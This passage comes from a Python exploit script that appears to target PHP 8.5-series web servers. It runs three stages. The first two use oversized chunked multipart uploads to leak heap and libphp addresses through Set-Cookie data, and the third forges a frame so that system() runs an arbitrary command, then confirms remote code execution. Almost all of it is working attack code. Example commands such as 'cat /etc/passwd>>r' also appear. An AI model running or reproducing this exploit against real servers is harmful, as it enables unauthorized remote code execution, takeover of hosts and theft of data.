    s = _connect(host, port, timeout)
    try:
        s.sendall(_get_head(host, port, path))
        data = b""
        while True:
            c = s.recv(65536)
            if not c: break
            data += c
            if len(data) > 4 << 20: break
    finally:
        s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    status = head.split(b"\r\n")[0].decode("latin1", "replace") if head else ""
    return status, body

# ------------------------------------------------------------------ stage runners
def run_stage1(host, port, path, max_tries=3):
    for t in range(1, max_tries + 1):
        log(c(f"[stage1] try {t}: arming (chunked ~{MEM_LIMIT_MB:g}MB upload)...", CYAN, BOLD))
        ka = KA(host, port, path)
        t0 = time.time()
        bd_a = _boundary(b"S" * 17)
        log(f"  -> POST {c(path, BOLD)} (chunked ~{MEM_LIMIT_MB:g}MB, boundary={bd_a.decode()})")
        body = arm_body("x", bd_a)
        dump_head(_request_headers(host, port, path, bd_a, chunked=True))
        st, resp = ka.send_request(body, bd_a, chunked=True)
        log(f"  <- {c(st, GREEN if '200' in st else YELLOW)} ({len(resp)} bytes) in {time.time()-t0:.1f}s")
        dump_head(_resp_head(resp))
        if not _conn_alive(resp):
            log(c("[stage1] arming response closed the connection -> retrying with a fresh one", YELLOW))
            continue
        bd_b = _boundary(b"B" * 10)
        body = stage1_body(bd_b)
        log(f"  -> POST {c(path, BOLD)} (Content-Length: {len(body)}, boundary={bd_b.decode()})")
        dump_head(_request_headers(host, port, path, bd_b, body_len=len(body)))
        st2, resp2 = ka.send_request(body, bd_b)
        raw = parse_cookie(resp2)
        log(f"  <- {c(st2, GREEN if '200' in st2 else YELLOW)} ({len(resp2)} bytes); Set-Cookie leak = {len(raw)} bytes")
        dump_head(_resp_head(resp2))
        if len(raw) >= 1000:
            cnt = Counter()
            for k in range(len(raw) - 8):
                v = int.from_bytes(raw[k:k+8], "little")
                if 0x100000000000 <= v < 0x800000000000: cnt[v & ~0x1FFFFF] += 1
            if cnt:
                base, n = cnt.most_common(1)[0]
                if n >= 8:
                    log(c(f"[stage1] LEAK chunk base = {base:#x} (cluster n={n})", GREEN, BOLD))
                    hexdump(raw, "stage-1 leaked Set-Cookie value (decoded)", max_bytes=256)
                    stat_record("stage1", True, f"heap base {base:#x} (cluster n={n}, try {t})")
                    return base
        log(c(f"[stage1] no valid leak (cookie len={len(raw)}, resp={st2[:40]!r}); retrying", YELLOW))
    stat_record("stage1", False, f"no valid heap leak after {max_tries} tries")
    return 0

def run_stage2(host, port, path, max_tries=3):
    for t in range(1, max_tries + 1):
        log(c(f"[stage2] try {t}: arming (chunked ~{MEM_LIMIT_MB:g}MB upload)...", CYAN, BOLD))
        ka = KA(host, port, path)
        t0 = time.time()
        bd_a = _boundary(b"S" * 17)
        log(f"  -> POST {c(path, BOLD)} (chunked ~{MEM_LIMIT_MB:g}MB, boundary={bd_a.decode()})")
        body = arm_body("x39", bd_a)
        dump_head(_request_headers(host, port, path, bd_a, chunked=True))
        st, resp = ka.send_request(body, bd_a, chunked=True)
        log(f"  <- {c(st, GREEN if '200' in st else YELLOW)} ({len(resp)} bytes) in {time.time()-t0:.1f}s")
        dump_head(_resp_head(resp))
        if not _conn_alive(resp):
            log(c("[stage2] arming response closed the connection -> retrying with a fresh one", YELLOW))
            continue
        bd_b = _boundary(b"B" * 10)
        body = stage2_body(bd_b)
        log(f"  -> POST {c(path, BOLD)} (Content-Length: {len(body)}, boundary={bd_b.decode()})")
        dump_head(_request_headers(host, port, path, bd_b, body_len=len(body)))
        st2, resp2 = ka.send_request(body, bd_b)
        raw = parse_cookie(resp2)
        log(f"  <- {c(st2, GREEN if '200' in st2 else YELLOW)} ({len(resp2)} bytes); Set-Cookie leak = {len(raw)} bytes")
        dump_head(_resp_head(resp2))
        if len(raw) >= 16:
            p = struct.unpack_from("<Q", raw + b"\x00" * 8, 8)[0]
            if (0x100000000000 <= p < 0x800000000000) and (p & 0xfff) == (DTOR & 0xfff):
                log(c(f"[stage2] LEAK libphp base = {p - DTOR:#x} (ptr={p:#x}, "
                      f"dtor gate OK: {p & 0xfff:#x} == {DTOR & 0xfff:#x})", GREEN, BOLD))
                hexdump(raw, "stage-2 leaked Set-Cookie value (decoded)")
                stat_record("stage2", True, f"libphp base {p - DTOR:#x} (try {t})")
                return p - DTOR
            log(c(f"  dtor gate failed (ptr={p:#x}, want low 12 bits == {DTOR & 0xfff:#x})", YELLOW))
        log(c(f"[stage2] no valid leak (cookie len={len(raw)}, resp={st2[:40]!r}); retrying", YELLOW))
    stat_record("stage2", False, f"no valid libphp leak after {max_tries} tries")
    return 0

def _proof_path(cmd):
    """Black-box proof artifact: the web path the command redirects output to
    (e.g. 'id>p' -> /p, 'cat /etc/passwd>>r' -> /r, spaced 'whoami >> q' -> /q) -
    user-provided, never hardcoded. File-descriptor redirects ('2>&1',
    '2>/dev/null') are stripped FIRST so their '>' is never mistaken for an output
    redirect - without this, '-c "cat /etc/passwd>>r 2>&1"' would verify '/&1'.
    The \\b keeps digit-suffixed filenames safe ('cat passwd2>r' still resolves to
    r). {1,2} is greedy so append redirects ('>>') are consumed whole and \\s*
    tolerates spaces around the operator; the LAST real redirect wins.
    Returns None when the cmd has no output redirect (nothing to verify)."""
    cleaned = re.sub(r"\b\d+>{1,2}\s*\S*", " ", cmd)
    m = re.findall(r">{1,2}\s*([^\s;|&>]+)", cleaned)
    return "/" + m[-1].lstrip("/") if m else None

def _conn_alive(resp):
    """True unless the response says the connection will be closed. HTTP/1.1 keeps
    connections alive by default, so only an explicit 'Connection: close' (or an
    HTTP/1.0 response without keep-alive) ends it - a server or proxy that omits
    the literal Keep-Alive header does NOT make the socket unusable; treating it
    as dead used to burn a full re-arm per retry for no reason."""
    if not resp:
        return False   # zero bytes = send_request got nothing back -> connection is dead
    head = resp.decode("latin1", "replace").split("\r\n\r\n")[0]
    lines = head.split("\r\n")
    if not lines or not lines[0]:
        return False   # no status line -> nothing usable came back
    conn = ""
    for l in lines[1:]:
        if l.lower().startswith("connection:"):
            conn = l.split(":", 1)[1].strip().lower()
    if "close" in conn:
        return False
    if "keep-alive" in conn:
        return True
    return not lines[0].lower().startswith("http/1.0")

def _resp_truncated(resp):
    """True when the response ended without a complete body - the worker died
    mid-request. A chunked body must end with the terminating 0-chunk; a
    Content-Length body must carry exactly that many body bytes. A frame miss
    returns the page's normal complete response; a hit kills the worker before
    or inside the final flush - the distinguishing signal for commands without
    an output redirect."""
    if not resp:
        return True
    head, sep, body = resp.partition(b"\r\n\r\n")
    if not sep:
        return True
    low = head.lower()
    if b"transfer-encoding: chunked" in low:
        return not body.endswith(b"0\r\n\r\n")
    m = re.search(rb"content-length:\s*(\d+)", low)
    if m:
        return len(body) != int(m.group(1))
    return False

def run_stage3(host, port, path, ht_abs, zif_abs, cmd, max_tries=3, extended=False):
    # proof = the file the user's cmd redirects to (no hardcoded path is ever
    # checked); its pre-attack body is the baseline for the change detection.
    # Without an output redirect there is no proof file: RCE is confirmed by the
    # worker dying during the exploit POST - the forged frame kills it before or
    # inside the final response flush, so the response is absent or truncated
    # before its final chunk (a complete 200 means the frame was not hit).
    proof_path = _proof_path(cmd)
    marker = None
    if extended and proof_path:
        marker = f"p2s{int(time.time())}"
        cmd = f"{cmd};echo {marker}>>{proof_path.lstrip('/')}"   # deterministic black-box proof artifact
    if extended:
        log(f"  -> extended carrier: cmd becomes {c(repr(cmd), MAGENTA)}"
            + (f" (marker {c(marker, GREEN)} appends a timestamp to the proof file so re-runs are detectable)" if marker else ""))
    if proof_path:
        st0, base_proof = http_get(host, port, proof_path)
        log(f"  baseline GET {c(proof_path, BOLD)} -> {c(st0, GREEN if '200' in st0 else DIM)} ({len(base_proof)} bytes)")
    else:
        log("  -> no proof file in the cmd - RCE is verified by the worker dying during "
            "the exploit POST (no response, or a response truncated before its final chunk)")
    for t in range(1, max_tries + 1):
        log(c(f"[stage3] try {t}: arming pads={PADS} (chunked ~{MEM_LIMIT_MB:g}MB upload)...", CYAN, BOLD))
        ka = KA(host, port, path)
        t0 = time.time()
        bd_a = _boundary(b"S" * 17)
        log(f"  -> POST {c(path, BOLD)} (chunked ~{MEM_LIMIT_MB:g}MB, boundary={bd_a.decode()})")
        body = arm_body("pads", bd_a)
        dump_head(_request_headers(host, port, path, bd_a, chunked=True))
        st, resp = ka.send_request(body, bd_a, chunked=True)
        log(f"  <- {c(st, GREEN if '200' in st else YELLOW)} ({len(resp)} bytes) in {time.time()-t0:.1f}s")
        dump_head(_resp_head(resp))
        if not _conn_alive(resp):
            log(c("[stage3] arming response closed the connection -> retrying with a fresh one", YELLOW))
            continue
        t0 = time.time()
        bd_b = _boundary(b"B" * 10)
        body = stage3_body(ht_abs, zif_abs, cmd, extended, boundary=bd_b)
        log(f"  -> POST {c(path, BOLD)} (Content-Length: {len(body)}, boundary={bd_b.decode()})")
        dump_head(_request_headers(host, port, path, bd_b, body_len=len(body)))
        st2, resp2 = ka.send_request(body, bd_b)
        closed = st2 == "<no response>"
        truncated = closed or _resp_truncated(resp2)
        log(f"  <- {c(st2 if st2 else '<no response>', GREEN if st2 else CYAN)} ({len(resp2)} bytes) "
            f"in {time.time()-t0:.1f}s"
            + (c("  [worker closed the connection]", CYAN) if closed
               else c("  [worker died mid-response - body truncated]", CYAN) if truncated else ""))
        dump_head(_resp_head(resp2))
        if proof_path:
            time.sleep(2.5)   # let shutdown (system()) finish writing the proof file
            stp, pbody = http_get(host, port, proof_path)
            if extended:
                if marker.encode() in pbody:
                    log(c(f"[stage3] RCE CONFIRMED try {t}: GET {proof_path} -> {stp} ({len(pbody)} bytes)", GREEN, BOLD))
                    hexdump(pbody, f"proof file GET {proof_path}")
                    stat_record("stage3", True, f"marker {marker} found in {proof_path} (try {t})")
                    return pbody.decode("latin1", "replace")
                log(c(f"[stage3] no marker yet (GET {proof_path}: {stp}); retrying with fresh conn/worker", YELLOW))
            else:
                ok = "200" in stp and len(pbody) > 0 and pbody != base_proof
                if ok:
                    log(c(f"[stage3] RCE CONFIRMED try {t}: GET {proof_path} -> {stp} ({len(pbody)} bytes)", GREEN, BOLD))
                    hexdump(pbody, f"proof file GET {proof_path}")
                    stat_record("stage3", True, f"{proof_path} content changed (try {t})")
                    return pbody.decode("latin1", "replace")
                log(c(f"[stage3] no proof yet (GET {proof_path}: {stp}); retrying with fresh conn/worker", YELLOW))
        else:
            if truncated:
                how = "no response" if closed else "response truncated before its final chunk"
                log(c(f"[stage3] RCE FIRED try {t}: worker died during the exploit POST "
                      f"({how}) - the forged frame was hit", GREEN, BOLD))
                stat_record("stage3", True, f"worker died during the exploit POST ({how}) (try {t})")
                return "worker-death signal"
            log(c(f"[stage3] no confirmation yet (resp={st2[:40]!r}); retrying with fresh conn/worker", YELLOW))
    stat_record("stage3", False, f"RCE not confirmed after {max_tries} tries")
    return None

def main():
    global COLOR, TLS, MEM_LIMIT_MB
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True,
                    help="target PHP page - its path is the POST target, e.g. "
                         "http://<authorized-target>/index.php; https:// is supported "
                         "(TLS, cert verification off by default)")
    ap.add_argument("--stage", type=int, default=3)
    ap.add_argument("-c", "--cmd", default="id>p",
                    help="command to run - any command is accepted. If it redirects "
                         "output to a web path (e.g. 'id>p'), that file (relative to "
                         "the docroot) is the proof artifact the tool GETs; without a "
                         "redirect, RCE is verified by the worker dying during the "
                         "exploit POST (no response, or a response truncated before "
                         "its final chunk)")
    ap.add_argument("--tries", type=int, default=3,
                    help="max full attack cycles per stage (default 3)")
    ap.add_argument("--version", default=None,
                    help="PHP version profile; "
                         "default: auto-detect from X-Powered-By; if undetectable, "
                         "the profile 8.5.11 is assumed - the stage-1 heap "
                         "leak is profile-independent, stages 2-3 use its offsets"
                         f"Available profiles: {", ".join(PROFILES.keys())} "
                         "NOT ALL OF THEM ARE TESTED!!!")
    ap.add_argument("--memory-limit", type=_parse_size_mb, default=140.0, metavar="SIZE",
                    help="arming multipart size; keep it above the target's PHP "
                         "memory_limit (default 140M; e.g. 100M, 512K, 1.5G)")
    ap.add_argument("--color", dest="color", action="store_const", const="always", default="auto",
                    help="force colored output (default: auto - on when stdout is a TTY)")
    ap.add_argument("--no-color", dest="color", action="store_const", const="never",
                    help="disable colored output")
    a = ap.parse_args()

    COLOR = a.color == "always" or (a.color == "auto" and sys.stdout.isatty())
    MEM_LIMIT_MB = a.memory_limit

    # the proof artifact is the file the user's cmd redirects to - no path is
    # hardcoded or assumed; without a redirect the worker-death signal is the proof
    proof_path = _proof_path(a.cmd)
    wrapper = f";echo p2s{int(time.time())}>>{proof_path.lstrip('/')}" if proof_path else ""
    extended = len(a.cmd.encode()) + len(wrapper) > CMD_CAP_SHORT
    if extended and len(a.cmd) + len(wrapper) > EXT_CMD_SPACE:
        print(c(f"cmd {a.cmd!r} is too long: it exceeds the extended carrier "
                f"(max {EXT_CMD_SPACE - len(wrapper)} bytes of cmd, marker write "
                "included)" if wrapper else f"cmd {a.cmd!r} is too long: it exceeds the "
                f"extended carrier (max {EXT_CMD_SPACE} bytes of cmd)", RED, BOLD))
        return 2
    u = urllib.parse.urlsplit(a.url)
    if u.scheme not in ("http", "https"):
        print(c(f"unsupported URL scheme {u.scheme!r}; use http:// or https://", RED, BOLD)); return 2
    TLS = (u.scheme == "https")
    host, port = u.hostname, u.port or (443 if TLS else 80)
    path = u.path or "/"
    log(f"target={c(a.url, BOLD)} stage={a.stage} cmd={c(repr(a.cmd), MAGENTA)} "
        f"proof={c(proof_path if proof_path else '(none - worker-death signal)', BOLD)}")

    # --- version profile: explicit --version wins, else auto-detect, else assume
    version = a.version or detect_php_version(host, port)
    if not version:
        version = max(PROFILES, key=lambda v: tuple(int(x) for x in v.split(".")))
        log(c(f"[*] PHP version unknown (no --version, no X-Powered-By) - assuming "
              f"{version} profile; the stage-1 heap leak is profile-independent, "
              "stages 2-3 use its offsets", YELLOW))
    try:
        select_profile(version)
    except KeyError:
        log(f"PHP {version} not in the vulnerable 8.5 series "
            f"(supported: {', '.join(sorted(PROFILES))})")
        return 1
    log(f"[*] target PHP version = {c(version, GREEN, BOLD)} (profile selected)")

    chunk = libphp = 0
    if a.stage >= 1:
        chunk = run_stage1(host, port, path, a.tries)
        if not chunk:
            log(c("STAGE 1 FAILED (no leak) - typical cause: display_errors=Off closes the "
                  "Set-Cookie channel", RED, BOLD))
            print_summary(False, "FAIL - stage 1: no valid heap leak")
            return 1
    else:
        log("[!] --stage>1 without stage-1 leak: using lab base (only valid if ASLR layout matches)")
        chunk = 0x7ffffe000000
    if a.stage >= 2:
        libphp = run_stage2(host, port, path, a.tries)
        if not libphp:
            log(c("STAGE 2 FAILED", RED, BOLD))
            print_summary(False, "FAIL - stage 2: no valid libphp leak")
            return 1
    else:
        libphp = 0x7ffffaa00000

    if a.stage >= 3:
        HT = chunk + (HTDATA_EXT if extended else HTDATA)
        ZIF_ABS = libphp + ZIF
        log(f"[*] HT={c(f'{HT:#x}', MAGENTA, BOLD)} zif_abs={c(f'{ZIF_ABS:#x}', MAGENTA, BOLD)} "
            f"carrier={'extended' if extended else 'standard'}")
        proof = run_stage3(host, port, path, HT, ZIF_ABS, a.cmd, a.tries, extended=extended)
        if proof:
            log(c("=== FULL RCE CONFIRMED ===", GREEN, BOLD))
            print_summary(True, "SUCCESS - RCE confirmed"
                          + (f" (proof: {proof_path})" if proof_path else
                             " (signal: worker died during the exploit POST)"))
            return 0
        log(c("STAGE 3 FAILED (no proof)", RED, BOLD))
        print_summary(False, "FAIL - stage 3: RCE not confirmed")
        return 2
    print_summary(True, f"SUCCESS - stages 1-{a.stage} complete")
    return 0

if __name__ == "__main__":
    sys.exit(main())
